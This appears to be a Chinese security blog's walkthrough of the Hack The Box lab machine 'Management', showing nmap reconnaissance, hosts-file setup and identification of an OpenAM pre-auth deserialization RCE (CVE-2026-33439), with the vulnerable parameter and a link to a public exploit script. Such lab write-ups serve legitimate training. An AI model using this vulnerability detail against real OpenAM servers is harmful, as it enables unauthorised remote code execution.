@@ -1,0 +1,1421 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Management 靶机 IP：10.129.77.52 攻击机 IP：10.10.17.69 连通性测试： 1 2 3 4 5 6 7 8 9 10 11 ┌──(root㉿kali)-[~/">
+<title>21. Management</title>
+
+<link rel='canonical' href='https://Sp1ke-sec.github.io/p/21.-management/'>
+
+<link rel="stylesheet" href="/scss/style.min.3dc2b87862416cdfa498393fe10f71a7856c63450472efbab1e94150643be501.css"><meta property='og:title' content="21. Management">
+<meta property='og:description' content="Management 靶机 IP：10.129.77.52 攻击机 IP：10.10.17.69 连通性测试： 1 2 3 4 5 6 7 8 9 10 11 ┌──(root㉿kali)-[~/">
+<meta property='og:url' content='https://Sp1ke-sec.github.io/p/21.-management/'>
+<meta property='og:site_name' content='Sp1ke-sec 安全博客'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-11-16T16:44:24&#43;08:00'/><meta property='article:modified_time' content='2026-11-16T16:44:24&#43;08:00'/><meta property='og:image' content='https://Sp1ke-sec.github.io/p/21.-management/assets/image-20261116114201933.png' />
+<meta name="twitter:title" content="21. Management">
+<meta name="twitter:description" content="Management 靶机 IP：10.129.77.52 攻击机 IP：10.10.17.69 连通性测试： 1 2 3 4 5 6 7 8 9 10 11 ┌──(root㉿kali)-[~/"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://Sp1ke-sec.github.io/p/21.-management/assets/image-20261116114201933.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu1489495842607495246.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🚭</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Sp1ke-sec 安全博客</a></h1>
+            <h2 class="site-description">这里是 Sp1ke-sec</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Sp1ke-sec'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#信息收集">信息收集</a>
+      <ol>
+        <li><a href="#端口探测">端口探测</a></li>
+      </ol>
+    </li>
+    <li><a href="#立足点">立足点</a>
+      <ol>
+        <li><a href="#cve-2026-33439">CVE-2026-33439</a></li>
+      </ol>
+    </li>
+    <li><a href="#横向移动">横向移动</a></li>
+    <li><a href="#提权">提权</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/21.-management/">
+                <img src="/p/21.-management/assets/image-20261116114201933_hu5477702943657341170.png"
+                        srcset="/p/21.-management/assets/image-20261116114201933_hu5477702943657341170.png 800w, /p/21.-management/assets/image-20261116114201933_hu12880416308984700263.png 1600w"
+                        width="800" 
+                        height="318" 
+                        loading="lazy"
+                        alt="Featured image of post 21. Management" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/htb/" style="background-color: #2a9d8f; color: #fff;">
+                HTB
+            </a>
+        
+            <a href="/categories/easy/" >
+                Easy
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/21.-management/">21. Management</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-11-16</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 7 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="management">Management
+</h1><p><img src="/p/21.-management/assets/image-20261116114201933.png"
+	width="471"
+	height="187"
+	srcset="/p/21.-management/assets/image-20261116114201933_hu4269824269104154980.png 480w, /p/21.-management/assets/image-20261116114201933_hu16799603193924453966.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261116114201933"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="251"
+		data-flex-basis="604px"
+	
+></p>
+<p>靶机 IP：10.129.77.52</p>
+<p>攻击机 IP：10.10.17.69</p>
+<p>连通性测试：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Management<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ping -c <span class="m">4</span> 10.129.77.52     
+</span></span><span class="line"><span class="cl">PING 10.129.77.52 <span class="o">(</span>10.129.77.52<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.129.77.52: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">460</span> ms
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.129.77.52: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">2</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">126</span> ms
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.129.77.52: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">3</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">128</span> ms
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.129.77.52: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">4</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">124</span> ms
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--- 10.129.77.52 ping statistics ---
+</span></span><span class="line"><span class="cl"><span class="m">4</span> packets transmitted, <span class="m">4</span> received, 0% packet loss, <span class="nb">time</span> 3009ms
+</span></span><span class="line"><span class="cl">rtt min/avg/max/mdev <span class="o">=</span> 124.282/209.723/460.096/144.558 ms
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>参考：</p>
+<p><a class="link" href="https://medium.com/@z9mohamed74/management-htb-write-up-dd7aedb4ad15"  target="_blank" rel="noopener"
+    >https://medium.com/@z9mohamed74/management-htb-write-up-dd7aedb4ad15</a></p>
+<p><a class="link" href="https://hackmd.io/@tranmanhtan/H1W_mzTFzx"  target="_blank" rel="noopener"
+    >https://hackmd.io/@tranmanhtan/H1W_mzTFzx</a></p>
+<h2 id="信息收集">信息收集
+</h2><h3 id="端口探测">端口探测
+</h3><p>使用 Nmap 进行端口扫描。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Management<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -Pn -T4 -p- 10.129.77.52
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-11-16 03:45 +0000
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.77.52 <span class="o">(</span>10.129.77.52<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.19s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">65528</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp    open  ssh
+</span></span><span class="line"><span class="cl">80/tcp    open  http
+</span></span><span class="line"><span class="cl">443/tcp   open  https
+</span></span><span class="line"><span class="cl">1689/tcp  open  firefox
+</span></span><span class="line"><span class="cl">4444/tcp  open  krb524
+</span></span><span class="line"><span class="cl">46409/tcp open  unknown
+</span></span><span class="line"><span class="cl">50389/tcp open  unknown
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 402.92 seconds
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Management<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -Pn -sV -sC -p 22,80,443,1689,4444,46409,50389 10.129.77.52
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-11-16 03:52 +0000
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> management.htb <span class="o">(</span>10.129.77.52<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.19s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE     VERSION
+</span></span><span class="line"><span class="cl">22/tcp    open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp    open  http        nginx 1.24.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to https://management.htb/
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.24.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">443/tcp   open  ssl/http    nginx 1.24.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.24.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Management <span class="se">\x</span>E2<span class="se">\x</span>80<span class="se">\x</span><span class="m">94</span> Managed IT <span class="p">&amp;</span>amp<span class="p">;</span> Infrastructure
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   http/1.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   http/1.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/0.9
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>management.htb/organizationName<span class="o">=</span>Management Managed Services Ltd
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:management.htb, DNS:*.management.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2026-06-02T01:21:44
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2126-05-09T01:21:44
+</span></span><span class="line"><span class="cl">1689/tcp  open  java-rmi    Java RMI
+</span></span><span class="line"><span class="cl"><span class="p">|</span> rmi-dumpregistry: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   org.opends.server.protocols.jmx.client-unknown
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     javax.management.remote.rmi.RMIServerImpl_Stub
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     @127.0.1.1:46409
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     extends
+</span></span><span class="line"><span class="cl"><span class="p">|</span>       java.rmi.server.RemoteStub
+</span></span><span class="line"><span class="cl"><span class="p">|</span>       extends
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_        java.rmi.server.RemoteObject
+</span></span><span class="line"><span class="cl">4444/tcp  open  ssl/krb524?
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>sso.management.htb/organizationName<span class="o">=</span>Administration Connector RSA Self-Signed Certificate
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2026-06-02T01:23:59
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2046-05-28T01:23:59
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   LDAPSearchReq: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     0&lt;0:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     objectClass1+
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     ds-root-dse
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    ds-cfg-root-dse-backend0
+</span></span><span class="line"><span class="cl">46409/tcp open  java-rmi    Java RMI
+</span></span><span class="line"><span class="cl">50389/tcp open  ldap        <span class="o">(</span>Anonymous <span class="nb">bind</span> OK<span class="o">)</span> 
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 107.72 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>PORT</th>
+<th>SERVICE</th>
+<th>NOTES</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22</td>
+<td>ssh</td>
+<td>OpenSSH 9.6p1</td>
+</tr>
+<tr>
+<td>80</td>
+<td>http</td>
+<td>nginx</td>
+</tr>
+<tr>
+<td>443</td>
+<td>https</td>
+<td>nginx</td>
+</tr>
+<tr>
+<td>1689</td>
+<td>java-rmi</td>
+<td>Java RMI</td>
+</tr>
+<tr>
+<td>4444</td>
+<td>ldaps</td>
+<td></td>
+</tr>
+<tr>
+<td>46409</td>
+<td>java-rmi</td>
+<td>Java RMI</td>
+</tr>
+<tr>
+<td>50389</td>
+<td>ldap</td>
+<td></td>
+</tr>
+</tbody>
+</table></div>
+<blockquote>
+<p>LDAP Lightweight Directory Access Protocol，轻量目录访问协议</p>
+<p>是一套用来查询、读取目录信息的协议。</p>
+<p>这里的目录一般用于存身份信息，如用户、账号、密码、组等等。</p>
+</blockquote>
+<h2 id="立足点">立足点
+</h2><p>访问 <code>http://10.129.77.52</code>，会被重定向到 443 端口的 <code>https://10.129.77.52</code>；又会被重定向为 <code>management.htb</code>。</p>
+<p>在 <code>hosts</code> 中添加一条规则，即可顺利访问：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.129.77.52 *.management.htb&#34;</span> &gt;&gt; /etc/hosts
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/21.-management/assets/image-20261116115302872.png"
+	width="2202"
+	height="1175"
+	srcset="/p/21.-management/assets/image-20261116115302872_hu15241102374374361396.png 480w, /p/21.-management/assets/image-20261116115302872_hu7055450526885994639.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261116115302872"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="187"
+		data-flex-basis="449px"
+	
+></p>
+<p>一个静态页面，本身没有什么功能点。</p>
+<p>点击右上角的 <code>Client login</code>，会跳转到 <code>sso.management.htb</code>，把这条规则也加入 <code>/etc/hosts</code>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">10.129.77.52 management.htb sso.management.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="cve-2026-33439">CVE-2026-33439
+</h3><p><img src="/p/21.-management/assets/image-20261116115957915.png"
+	width="1684"
+	height="812"
+	srcset="/p/21.-management/assets/image-20261116115957915_hu17480699269416408015.png 480w, /p/21.-management/assets/image-20261116115957915_hu14246141391042314570.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261116115957915"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="207"
+		data-flex-basis="497px"
+	
+></p>
+<p>Open Access Management（OpenAM）是一种访问管理解决方案。</p>
+<p>查看页面源代码获取版本信息。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">require</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">urlArgs</span> <span class="o">:</span> <span class="s2">&#34;v=16.0.5&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">deps</span> <span class="o">:</span> <span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可知版本为 <code>v16.0.5</code>，存在 <code>CVE-2026-33439</code> Pre-Auth RCE。</p>
+<p>在 16.0.6 版本之前，OpenIdentityPlatform OpenAM 存在通过不安全的 Java 反序列化 jato.clientSession HTTP 参数进行无需身份验证远程代码执行 (RCE) 的漏洞。未经身份验证的攻击者可以通过发送精心构造的序列化 Java 对象，在服务器上执行任意命令。作为 jato.clientSession GET/POST 参数，向任何 JSP 包含 <code>&lt;jato:form&gt;</code> 标签的 JATO ViewBean 端点发送请求（例如，密码重置页面）。</p>
+<p>利用脚本：https://github.com/infernosalex/CVE-2026-33439-Python-PoC</p>
